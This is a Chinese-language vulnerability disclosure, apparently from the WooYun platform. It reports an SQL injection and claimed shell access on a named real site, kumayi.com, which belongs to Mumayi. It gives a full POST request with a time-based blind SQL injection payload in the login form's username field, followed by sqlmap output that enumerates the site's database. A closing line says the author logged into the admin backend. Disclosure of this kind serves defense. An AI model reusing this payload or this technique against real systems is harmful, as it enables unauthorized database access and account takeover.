wybug_title: 木蚂蚁旗下某站存在SQL注入/并Getshell
wybug_detail:
漏洞详情 披露状态：   									2016-04-30：	细节已通知厂商并且等待厂商处理中									2016-05-03：	厂商已经确认，细节仅向厂商公开									2016-05-13：	细节向核心白帽子及相关领域专家公开									2016-05-23：	细节向普通白帽子公开									2016-06-02：	细节向实习白帽子公开									2016-06-17：	细节向公众公开  简要描述： 木蚂蚁旗下某站存在SQL注入,并getshell 详细说明：  木蚂蚁旗下某站存在SQL注入,并getshell旗下kumayi.com  存在post盲注 POST /admin.htm HTTP/1.1Content-Length: 215Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://www.kumayi.com:80/Cookie: PHPSESSID=12k6poruju02v827qqkf961ja4Host: www.kumayi.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*email=sample%40email.tst&password=g00dPa%24%24w0rD&remember=remember-me&username=if(now()%3dsysdate()%2csleep(0)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(0)%2c0))OR%22*/   漏洞证明：  [18:19:30] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.3.21back-end DBMS: MySQL 5[18:19:30] [INFO] fetching database names[18:19:30] [INFO] fetching number of databases[18:19:30] [INFO] resumed: 6[18:19:30] [WARNING] (case) time-based comparison requires larger statistical mo[18:19:30] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the request(s).............................. (done)[18:19:42] [WARNING] it is very important to not stress the network adapter during usage of time-based payloads to prevent potential disruptions[18:19:43] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[18:19:43] [INFO] retrieved:do you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] y[18:20:24] [ERROR] invalid character detected. retrying..[18:20:24] [WARNING] increasing time delay to 6 seconds[18:20:26] [INFO] retrieved:[18:20:29] [INFO] retrieved:[18:20:32] [INFO] retrieved:[18:20:34] [INFO] retrieved:[18:20:38] [INFO] falling back to current database[18:20:38] [INFO] fetching current database[18:20:38] [INFO] resumed: kumayipay_kumayiavailable databases [1]:[*] kumayipay_kumayi[18:20:38] [INFO] fetched data logged to text files under 'C:\Users\Administrator\.sqlmap\output\www.kumayi.com'

拿到帐号密码后 登录后台
